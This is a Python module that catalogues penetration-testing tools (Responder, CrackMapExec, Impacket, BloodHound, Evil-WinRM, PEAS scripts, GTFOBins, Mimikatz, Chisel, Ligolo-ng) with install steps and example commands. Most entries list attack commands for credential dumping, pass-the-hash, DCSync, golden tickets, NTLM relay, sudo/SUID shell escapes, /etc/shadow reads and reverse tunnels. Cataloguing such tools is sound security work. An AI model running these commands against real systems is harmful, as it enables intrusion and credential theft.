#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Complete Security Tools Integration Module - Part 2
Network Exploitation, Privilege Escalation, and Post-Exploitation Tools
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from .web_security import SecurityTool

class NetworkExploitationTools:
    """Network Exploitation and Active Directory Tools"""
    
    def __init__(self):
        self.tools = self._initialize_tools()
    
    def _initialize_tools(self) -> Dict[str, SecurityTool]:
        return {
            # ===== NETWORK EXPLOITATION =====
            "RESPONDER": SecurityTool(
                name="Responder",
                category="Network Exploitation",
                subcategory="LLMNR/NBT-NS Poisoning",
                description="LLMNR, NBT-NS and MDNS poisoner with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server",
                installation={
                    "linux": "git clone https://github.com/lgandx/Responder.git",
                    "kali": "apt-get install responder"
                },
                usage=[
                    "python Responder.py -I eth0 -rdwv",
                    "python Responder.py -I eth0 -A",
                    "python Responder.py -I eth0 -wFb"
                ],
                examples=[
                    {
                        "description": "Basic poisoning attack",
                        "command": "python Responder.py -I eth0 -rdwv"
                    },
                    {
                        "description": "Analyze mode (passive)",
                        "command": "python Responder.py -I eth0 -A"
                    },
                    {
                        "description": "Force WPAD auth",
                        "command": "python Responder.py -I eth0 -wFb"
                    },
                    {
                        "description": "Target specific host",
                        "command": "python Responder.py -I eth0 -rdwv -t 192.168.1.100"
                    },
                    {
                        "description": "Fingerprint mode",
                        "command": "python Responder.py -I eth0 -f"
                    }
                ],
                options=[
                    {"flag": "-I", "description": "Network interface"},
                    {"flag": "-A", "description": "Analyze mode"},
                    {"flag": "-r", "description": "Enable answers for netbios requests"},
                    {"flag": "-d", "description": "Enable answers for domain suffix queries"},
                    {"flag": "-w", "description": "Start the WPAD rogue server"},
                    {"flag": "-F", "description": "Force NTLM/Basic authentication"},
                    {"flag": "-b", "description": "Return a Basic HTTP authentication"}
                ],
                output_format="txt/log",
                requires_root=True,
                api_support=False,
                gui_available=False,
                platform=["linux"],
                dependencies=["python2", "python3"],
                documentation="https://github.com/lgandx/Responder",
                github="https://github.com/lgandx/Responder",
                alternatives=["Inveigh", "mitm6"]
            ),
            
            "CRACKMAPEXEC": SecurityTool(
                name="CrackMapExec",
                category="Network Exploitation",
                subcategory="Network Protocol Exploitation",
                description="Swiss army knife for pentesting networks",
                installation={
                    "linux": "pip3 install crackmapexec",
                    "docker": "docker pull byt3bl33d3r/crackmapexec",
                    "apt": "apt-get install crackmapexec"
                },
                usage=[
                    "crackmapexec smb 192.168.1.0/24",
                    "crackmapexec smb 192.168.1.0/24 -u user -p password",
                    "crackmapexec smb 192.168.1.0/24 -u user -p password --shares",
                    "crackmapexec smb 192.168.1.0/24 -u user -p password -x 'whoami'"
                ],
                examples=[
                    {
                        "description": "SMB enumeration",
                        "command": "crackmapexec smb 192.168.1.0/24"
                    },
                    {
                        "description": "SMB authentication",
                        "command": "crackmapexec smb 192.168.1.100 -u administrator -p 'Password123!'"
                    },
                    {
                        "description": "Execute command",
                        "command": "crackmapexec smb 192.168.1.100 -u admin -p pass -x 'ipconfig'"
                    },
                    {
                        "description": "Dump SAM",
                        "command": "crackmapexec smb 192.168.1.100 -u admin -p pass --sam"
                    },
                    {
                        "description": "Pass the hash",
                        "command": "crackmapexec smb 192.168.1.100 -u admin -H 'NTHASH'"
                    },
                    {
                        "description": "Enumerate shares",
                        "command": "crackmapexec smb 192.168.1.0/24 -u user -p pass --shares"
                    },
                    {
                        "description": "Spider shares",
                        "command": "crackmapexec smb 192.168.1.100 -u user -p pass -M spider_plus"
                    }
                ],
                options=[
                    {"flag": "-u", "description": "Username"},
                    {"flag": "-p", "description": "Password"},
                    {"flag": "-H", "description": "NTLM hash"},
                    {"flag": "--shares", "description": "Enumerate shares"},
                    {"flag": "--sessions", "description": "Enumerate sessions"},
                    {"flag": "--sam", "description": "Dump SAM hashes"},
                    {"flag": "-x", "description": "Execute command"},
                    {"flag": "-X", "description": "Execute PowerShell"},
                    {"flag": "-M", "description": "Module to use"}
                ],
                output_format="txt/csv",
                requires_root=False,
                api_support=False,
                gui_available=False,
                platform=["linux", "windows"],
                dependencies=["python3"],
                documentation="https://wiki.porchetta.industries/",
                github="https://github.com/byt3bl33d3r/CrackMapExec",
                alternatives=["smbclient", "enum4linux", "smbmap"]
            ),
            
            "IMPACKET": SecurityTool(
                name="Impacket",
                category="Network Exploitation",
                subcategory="Network Protocol Library",
                description="Python classes for working with network protocols",
                installation={
                    "linux": "git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && pip install .",
                    "pip": "pip install impacket"
                },
                usage=[
                    "impacket-smbexec domain/user:password@target",
                    "impacket-wmiexec domain/user:password@target",
                    "impacket-psexec domain/user:password@target",
                    "impacket-secretsdump domain/user:password@target"
                ],
                examples=[
                    {
                        "description": "SMB execution",
                        "command": "impacket-smbexec DOMAIN/user:password@192.168.1.100"
                    },
                    {
                        "description": "WMI execution",
                        "command": "impacket-wmiexec DOMAIN/user:password@192.168.1.100"
                    },
                    {
                        "description": "PsExec",
                        "command": "impacket-psexec DOMAIN/user:password@192.168.1.100"
                    },
                    {
                        "description": "Dump secrets",
                        "command": "impacket-secretsdump DOMAIN/user:password@192.168.1.100"
                    },
                    {
                        "description": "GetNPUsers (ASREPRoast)",
                        "command": "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat"
                    },
                    {
                        "description": "GetUserSPNs (Kerberoasting)",
                        "command": "impacket-GetUserSPNs DOMAIN/user:password -request"
                    },
                    {
                        "description": "NTLM relay",
                        "command": "impacket-ntlmrelayx -tf targets.txt -smb2support"
                    }
                ],
                options=[
                    {"flag": "-hashes", "description": "NTLM hashes"},
                    {"flag": "-no-pass", "description": "No password"},
                    {"flag": "-k", "description": "Use Kerberos"},
                    {"flag": "-dc-ip", "description": "Domain controller IP"},
                    {"flag": "-target-ip", "description": "Target IP"},
                    {"flag": "-port", "description": "Target port"}
                ],
                output_format="txt",
                requires_root=False,
                api_support=True,
                gui_available=False,
                platform=["linux", "windows", "macos"],
                dependencies=["python3", "ldap3", "pyasn1"],
                documentation="https://www.secureauth.com/labs/open-source-tools/impacket/",
                github="https://github.com/SecureAuthCorp/impacket",
                alternatives=["Metasploit", "PowerShell Empire"]
            ),
            
            "BLOODHOUND": SecurityTool(
                name="BloodHound",
                category="Network Exploitation",
                subcategory="Active Directory Enumeration",
                description="Active Directory attack path visualization tool",
                installation={
                    "linux": "apt-get install bloodhound",
                    "docker": "docker pull specterops/bloodhound",
                    "manual": "Download from https://github.com/BloodHoundAD/BloodHound/releases"
                },
                usage=[
                    "bloodhound-python -u user -p password -d domain.local -c all",
                    "neo4j console",
                    "bloodhound"
                ],
                examples=[
                    {
                        "description": "Collect AD data",
                        "command": "bloodhound-python -u user -p 'password' -d domain.local -c all -ns 192.168.1.1"
                    },
                    {
                        "description": "SharpHound collection",
                        "command": "SharpHound.exe -c all -d domain.local"
                    },
                    {
                        "description": "Start Neo4j",
                        "command": "neo4j console"
                    },
                    {
                        "description": "Run BloodHound GUI",
                        "command": "bloodhound"
                    },
                    {
                        "description": "Custom queries",
                        "command": "MATCH (u:User {enabled:true}) RETURN u"
                    }
                ],
                options=[
                    {"flag": "-c", "description": "Collection method"},
                    {"flag": "-d", "description": "Domain"},
                    {"flag": "-u", "description": "Username"},
                    {"flag": "-p", "description": "Password"},
                    {"flag": "-ns", "description": "Nameserver"},
                    {"flag": "--zip", "description": "Zip output"}
                ],
                output_format="json/zip",
                requires_root=False,
                api_support=True,
                gui_available=True,
                platform=["linux", "windows", "macos"],
                dependencies=["neo4j", "java"],
                documentation="https://bloodhound.readthedocs.io/",
                github="https://github.com/BloodHoundAD/BloodHound",
                alternatives=["PingCastle", "ADExplorer", "PowerView"]
            ),
            
            "EVIL_WINRM": SecurityTool(
                name="Evil-WinRM",
                category="Network Exploitation",
                subcategory="Windows Remote Management",
                description="Windows Remote Management shell for pentesting",
                installation={
                    "linux": "gem install evil-winrm",
                    "docker": "docker pull oscarakaelvis/evil-winrm"
                },
                usage=[
                    "evil-winrm -i IP -u user -p password",
                    "evil-winrm -i IP -u user -H hash",
                    "evil-winrm -i IP -u user -p password -s scripts/ -e exes/"
                ],
                examples=[
                    {
                        "description": "Basic connection",
                        "command": "evil-winrm -i 192.168.1.100 -u administrator -p 'Password123!'"
                    },
                    {
                        "description": "Pass the hash",
                        "command": "evil-winrm -i 192.168.1.100 -u administrator -H 'NTHASH'"
                    },
                    {
                        "description": "With SSL",
                        "command": "evil-winrm -i 192.168.1.100 -u admin -p pass -S -P 5986"
                    },
                    {
                        "description": "Load PowerShell scripts",
                        "command": "evil-winrm -i 192.168.1.100 -u admin -p pass -s /opt/scripts/"
                    },
                    {
                        "description": "Upload/Download files",
                        "command": "upload local_file.txt C:\\temp\\file.txt"
                    }
                ],
                options=[
                    {"flag": "-i", "description": "Target IP"},
                    {"flag": "-u", "description": "Username"},
                    {"flag": "-p", "description": "Password"},
                    {"flag": "-H", "description": "NTLM hash"},
                    {"flag": "-s", "description": "PowerShell scripts path"},
                    {"flag": "-e", "description": "Executables path"},
                    {"flag": "-S", "description": "SSL"},
                    {"flag": "-P", "description": "Port"}
                ],
                output_format="interactive shell",
                requires_root=False,
                api_support=False,
                gui_available=False,
                platform=["linux"],
                dependencies=["ruby", "winrm gem"],
                documentation="https://github.com/Hackplayers/evil-winrm",
                github="https://github.com/Hackplayers/evil-winrm",
                alternatives=["winrm", "Enter-PSSession", "psexec"]
            ),
            
            # ===== PRIVILEGE ESCALATION TOOLS =====
            "LINPEAS": SecurityTool(
                name="LinPEAS",
                category="Privilege Escalation",
                subcategory="Linux Enumeration",
                description="Linux Privilege Escalation Awesome Script",
                installation={
                    "linux": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
                    "curl": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
                },
                usage=[
                    "bash linpeas.sh",
                    "bash linpeas.sh -a",
                    "bash linpeas.sh -s"
                ],
                examples=[
                    {
                        "description": "Basic enumeration",
                        "command": "bash linpeas.sh"
                    },
                    {
                        "description": "All checks",
                        "command": "bash linpeas.sh -a"
                    },
                    {
                        "description": "Stealth mode",
                        "command": "bash linpeas.sh -s"
                    },
                    {
                        "description": "Output to file",
                        "command": "bash linpeas.sh | tee linpeas_output.txt"
                    },
                    {
                        "description": "Fast mode",
                        "command": "bash linpeas.sh fast"
                    }
                ],
                options=[
                    {"flag": "-a", "description": "All checks"},
                    {"flag": "-s", "description": "Stealth mode"},
                    {"flag": "-h", "description": "Help"},
                    {"flag": "fast", "description": "Fast mode"},
                    {"flag": "superfast", "description": "Super fast mode"}
                ],
                output_format="colored text",
                requires_root=False,
                api_support=False,
                gui_available=False,
                platform=["linux"],
                dependencies=["bash"],
                documentation="https://github.com/carlospolop/PEASS-ng",
                github="https://github.com/carlospolop/PEASS-ng",
                alternatives=["LinEnum", "linux-exploit-suggester", "LSE"]
            ),
            
            "WINPEAS": SecurityTool(
                name="WinPEAS",
                category="Privilege Escalation",
                subcategory="Windows Enumeration",
                description="Windows Privilege Escalation Awesome Script",
                installation={
                    "windows": "Download from https://github.com/carlospolop/PEASS-ng/releases",
                    "compile": "dotnet build winPEAS.csproj"
                },
                usage=[
                    "winpeas.exe",
                    "winpeas.exe cmd fast",
                    "winpeas.exe cmd searchfast"
                ],
                examples=[
                    {
                        "description": "Basic enumeration",
                        "command": "winpeas.exe"
                    },
                    {
                        "description": "Fast mode",
                        "command": "winpeas.exe cmd fast"
                    },
                    {
                        "description": "Search fast",
                        "command": "winpeas.exe cmd searchfast"
                    },
                    {
                        "description": "Specific checks",
                        "command": "winpeas.exe cmd systeminfo userinfo"
                    },
                    {
                        "description": "Output to file",
                        "command": "winpeas.exe > winpeas_output.txt"
                    }
                ],
                options=[
                    {"flag": "cmd", "description": "Command mode"},
                    {"flag": "fast", "description": "Fast checks"},
                    {"flag": "searchfast", "description": "Fast search"},
                    {"flag": "systeminfo", "description": "System information"},
                    {"flag": "userinfo", "description": "User information"}
                ],
                output_format="colored text",
                requires_root=False,
                api_support=False,
                gui_available=False,
                platform=["windows"],
                dependencies=[".NET"],
                documentation="https://github.com/carlospolop/PEASS-ng",
                github="https://github.com/carlospolop/PEASS-ng",
                alternatives=["PowerUp", "Seatbelt", "SharpUp"]
            ),
            
            "GTFOBINS": SecurityTool(
                name="GTFOBins",
                category="Privilege Escalation",
                subcategory="Unix Binaries Exploitation",
                description="Unix binaries that can be used to bypass local security restrictions",
                installation={
                    "web": "https://gtfobins.github.io/",
                    "cli": "pip install gtfobins-cli"
                },
                usage=[
                    "Visit https://gtfobins.github.io/",
                    "Search for binary name",
                    "gtfobins-cli search sudo"
                ],
                examples=[
                    {
                        "description": "Sudo privilege escalation",
                        "command": "sudo find . -exec /bin/sh \\; -quit"
                    },
                    {
                        "description": "SUID exploitation",
                        "command": "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    },
                    {
                        "description": "Capabilities exploitation",
                        "command": "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
                    },
                    {
                        "description": "File read",
                        "command": "sudo less /etc/shadow"
                    },
                    {
                        "description": "File write",
                        "command": "echo 'data' | sudo tee /etc/passwd"
                    }
                ],
                options=[
                    {"flag": "sudo", "description": "Sudo exploitation"},
                    {"flag": "suid", "description": "SUID exploitation"},
                    {"flag": "capabilities", "description": "Linux capabilities"},
                    {"flag": "shell", "description": "Shell spawn"},
                    {"flag": "file-read", "description": "File read"},
                    {"flag": "file-write", "description": "File write"}
                ],
                output_format="web/text",
                requires_root=False,
                api_support=False,
                gui_available=False,
                platform=["linux", "unix"],
                dependencies=["none"],
                documentation="https://gtfobins.github.io/",
                github="https://github.com/GTFOBins/GTFOBins.github.io",
                alternatives=["LOLBAS", "WADComs"]
            ),
            
            # ===== POST-EXPLOITATION & PERSISTENCE =====
            "MIMIKATZ": SecurityTool(
                name="Mimikatz",
                category="Post-Exploitation",
                subcategory="Credential Dumping",
                description="Windows credential extraction tool",
                installation={
                    "windows": "Download from https://github.com/gentilkiwi/mimikatz/releases",
                    "compile": "Visual Studio compile from source"
                },
                usage=[
                    "mimikatz.exe",
                    "privilege::debug",
                    "sekurlsa::logonpasswords",
                    "lsadump::sam"
                ],
                examples=[
                    {
                        "description": "Dump logon passwords",
                        "command": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"
                    },
                    {
                        "description": "Dump SAM",
                        "command": "mimikatz.exe 'privilege::debug' 'lsadump::sam' exit"
                    },
                    {
                        "description": "Pass the hash",
                        "command": "mimikatz.exe 'sekurlsa::pth /user:admin /domain:domain /ntlm:hash'"
                    },
                    {
                        "description": "Golden ticket",
                        "command": "mimikatz.exe 'kerberos::golden /user:admin /domain:domain /sid:S-1-5-21... /krbtgt:hash'"
                    },
                    {
                        "description": "DCSync",
                        "command": "mimikatz.exe 'lsadump::dcsync /domain:domain /user:krbtgt'"
                    }
                ],
                options=[
                    {"flag": "privilege::debug", "description": "Enable debug privilege"},
                    {"flag": "sekurlsa::", "description": "Extract passwords"},
                    {"flag": "lsadump::", "description": "Dump SAM/LSA"},
                    {"flag": "kerberos::", "description": "Kerberos tickets"},
                    {"flag": "vault::", "description": "Vault credentials"}
                ],
                output_format="text",
                requires_root=True,
                api_support=False,
                gui_available=False,
                platform=["windows"],
                dependencies=["none"],
                documentation="https://github.com/gentilkiwi/mimikatz/wiki",
                github="https://github.com/gentilkiwi/mimikatz",
                alternatives=["LaZagne", "Rubeus", "SharpKatz"]
            ),
            
            # ===== PIVOTING & TUNNELING =====
            "CHISEL": SecurityTool(
                name="Chisel",
                category="Pivoting",
                subcategory="TCP/UDP Tunnel",
                description="Fast TCP/UDP tunnel over HTTP",
                installation={
                    "linux": "wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz",
                    "windows": "Download from https://github.com/jpillora/chisel/releases",
                    "go": "go install github.com/jpillora/chisel@latest"
                },
                usage=[
                    "chisel server -p 8080 --reverse",
                    "chisel client SERVER_IP:8080 R:socks",
                    "chisel client SERVER_IP:8080 R:8001:127.0.0.1:8001"
                ],
                examples=[
                    {
                        "description": "Server mode",
                        "command": "chisel server -p 8080 --reverse"
                    },
                    {
                        "description": "Client SOCKS proxy",
                        "command": "chisel client 10.10.10.10:8080 R:socks"
                    },
                    {
                        "description": "Port forwarding",
                        "command": "chisel client 10.10.10.10:8080 R:3389:192.168.1.100:3389"
                    },
                    {
                        "description": "Multiple tunnels",
                        "command": "chisel client SERVER:8080 R:8001:127.0.0.1:8001 R:8002:127.0.0.1:8002"
                    },
                    {
                        "description": "Authenticated tunnel",
                        "command": "chisel server -p 8080 --auth user:pass"
                    }
                ],
                options=[
                    {"flag": "server", "description": "Server mode"},
                    {"flag": "client", "description": "Client mode"},
                    {"flag": "-p", "description": "Port"},
                    {"flag": "--reverse", "description": "Reverse tunnel"},
                    {"flag": "R:socks", "description": "SOCKS proxy"},
                    {"flag": "--auth", "description": "Authentication"}
                ],
                output_format="none",
                requires_root=False,
                api_support=False,
                gui_available=False,
                platform=["linux", "windows", "macos"],
                dependencies=["none"],
                documentation="https://github.com/jpillora/chisel",
                github="https://github.com/jpillora/chisel",
                alternatives=["ligolo-ng", "sshuttle", "socat"]
            ),
            
            "LIGOLO_NG": SecurityTool(
                name="Ligolo-ng",
                category="Pivoting",
                subcategory="Tunneling",
                description="Advanced tunneling/pivoting tool",
                installation={
                    "linux": "wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz",
                    "windows": "Download from https://github.com/nicocha30/ligolo-ng/releases"
                },
                usage=[
                    "ligolo-proxy -selfcert",
                    "ligolo-agent -connect PROXY_IP:11601 -ignore-cert",
                    "session > start"
                ],
                examples=[
                    {
                        "description": "Start proxy",
                        "command": "ligolo-proxy -selfcert -laddr 0.0.0.0:11601"
                    },
                    {
                        "description": "Connect agent",
                        "command": "ligolo-agent -connect 10.10.10.10:11601 -ignore-cert"
                    },
                    {
                        "description": "Add route",
                        "command": "sudo ip route add 192.168.1.0/24 dev ligolo"
                    },
                    {
                        "description": "Start tunnel",
                        "command": "session > start"
                    },
                    {
                        "description": "List sessions",
                        "command": "sessions"
                    }
                ],
                options=[
                    {"flag": "-selfcert", "description": "Self-signed certificate"},
                    {"flag": "-laddr", "description": "Listen address"},
                    {"flag": "-connect", "description": "Connect to proxy"},
                    {"flag": "-ignore-cert", "description": "Ignore certificate"},
                    {"flag": "-retry", "description": "Retry connection"}
                ],
                output_format="interactive",
                requires_root=True,
                api_support=False,
                gui_available=False,
                platform=["linux", "windows"],
                dependencies=["none"],
                documentation="https://github.com/nicocha30/ligolo-ng",
                github="https://github.com/nicocha30/ligolo-ng",
                alternatives=["chisel", "rpivot", "revsocks"]
            )
        }
    
    def get_tool(self, tool_name: str) -> Optional[SecurityTool]:
        """Get specific tool information"""
        return self.tools.get(tool_name.upper())
    
    def get_tools_by_category(self, category: str) -> List[SecurityTool]:
        """Get tools by category"""
        return [tool for tool in self.tools.values() if tool.category.lower() == category.lower()]